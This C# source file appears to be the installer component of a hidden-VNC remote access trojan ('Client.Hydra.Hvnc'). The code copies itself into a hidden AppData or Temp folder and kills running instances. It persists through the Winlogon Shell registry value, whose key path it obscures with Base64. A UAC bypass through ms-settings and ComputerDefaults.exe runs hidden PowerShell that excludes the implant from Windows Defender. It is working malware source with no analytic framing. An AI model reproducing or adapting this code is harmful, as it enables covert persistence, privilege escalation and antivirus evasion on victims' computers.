using System;
using System.Diagnostics;
using System.IO;
using System.Text;
using System.Threading;
using System.Windows.Forms;
using Microsoft.Win32;

namespace Client.Hydra.Hvnc
{
	public static class Installer
	{
		public static FileInfo FileName;

		public static DirectoryInfo DirectoryName;

		public static void Run(string path, string folder, string filename, string wdex)
		{
			Installer.FileName = new FileInfo(filename);
			if (path == "0")
			{
				Installer.DirectoryName = new DirectoryInfo(Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), folder));
			}
			if (path == "1")
			{
				Installer.DirectoryName = new DirectoryInfo(Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), folder));
			}
			if (path == "2")
			{
				Installer.DirectoryName = new DirectoryInfo(Path.Combine(Path.GetTempPath(), folder));
			}
			if (!Installer.IsInstalled())
			{
				try
				{
					Installer.CreateDirectory();
					Installer.InstallFile();
					Installer.InstallRegistry();
				}
				catch
				{
				}
			}
		}

		public static bool IsInstalled()
		{
			if (Application.ExecutablePath == Path.Combine(Installer.DirectoryName.FullName, Installer.FileName.Name))
			{
				return true;
			}
			return false;
		}

		public static void CreateDirectory()
		{
			if (!Installer.DirectoryName.Exists)
			{
				Installer.DirectoryName.Create();
			}
			Installer.DirectoryName.Attributes = FileAttributes.Hidden;
		}

		public static void InstallFile()
		{
			string text = Path.Combine(Installer.DirectoryName.FullName, Installer.FileName.Name);
			if (Installer.FileName.Exists)
			{
				Process[] processes = Process.GetProcesses();
				foreach (Process process in processes)
				{
					try
					{
						if (process.MainModule.FileName == text)
						{
							process.Kill();
						}
					}
					catch
					{
					}
				}
				File.Delete(text);
				Thread.Sleep(250);
			}
			using FileStream fileStream = new FileStream(text, FileMode.Create, FileAccess.Write);
			byte[] array = File.ReadAllBytes(Application.ExecutablePath);
			fileStream.Write(array, 0, array.Length);
		}

		public static void InstallRegistry()
		{
			if (Installer.GetRegKey() == null)
			{
				byte[] bytes = Convert.FromBase64String("U29mdHdhcmVcTWljcm9zb2Z0XFdpbmRvd3MgTlRcQ3VycmVudFZlcnNpb25cV2lubG9nb25c");
				string @string = Encoding.UTF8.GetString(bytes);
				RegistryKey registryKey = Registry.CurrentUser.CreateSubKey(@string);
				registryKey.SetValue("Shell", "explorer.exe, " + Path.Combine(Installer.DirectoryName.FullName, Installer.FileName.Name));
				registryKey.Close();
			}
			else if (!Installer.GetRegKey().Contains(Path.Combine(Installer.DirectoryName.FullName, Installer.FileName.Name)))
			{
				string value = ((!(Installer.GetRegKey().Substring(Installer.GetRegKey().Length - 1, 1) == ",")) ? (Installer.GetRegKey() + "," + Path.Combine(Installer.DirectoryName.FullName, Installer.FileName.Name) + ",") : (Installer.GetRegKey() + Path.Combine(Installer.DirectoryName.FullName, Installer.FileName.Name) + ","));
				byte[] bytes2 = Convert.FromBase64String("U29mdHdhcmVcTWljcm9zb2Z0XFdpbmRvd3MgTlRcQ3VycmVudFZlcnNpb25cV2lubG9nb24=");
				string string2 = Encoding.UTF8.GetString(bytes2);
				Registry.CurrentUser.OpenSubKey(string2, writable: true).SetValue("Shell", value);
			}
		}

		public static void ExclusionWD()
		{
			try
			{
				RegistryKey registryKey = Registry.CurrentUser.CreateSubKey("Software\\Classes\\ms-settings\\shell\\open\\command");
				registryKey.SetValue("", "powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -NoProfile -Command Add-MpPreference -ExclusionPath '" + Path.Combine(Installer.DirectoryName.FullName, Installer.FileName.Name) + "'");
				registryKey.Close();
				RegistryKey registryKey2 = Registry.CurrentUser.CreateSubKey("Software\\Classes\\ms-settings\\shell\\open\\command");
				registryKey2.SetValue("DelegateExecute", "");
				registryKey2.Close();
				Process.Start("C:\\Windows\\System32\\ComputerDefaults.exe");
				Thread.Sleep(1000);
			}
			catch
			{
			}
		}

		public static string GetRegKey()
		{
			try
			{
				byte[] bytes = Convert.FromBase64String("U29mdHdhcmVcTWljcm9zb2Z0XFdpbmRvd3MgTlRcQ3VycmVudFZlcnNpb25cV2lubG9nb25c");
				string @string = Encoding.UTF8.GetString(bytes);
				return Registry.CurrentUser.OpenSubKey(@string).GetValue("Shell").ToString();
			}
			catch
			{
				return null;
			}
		}
	}
}
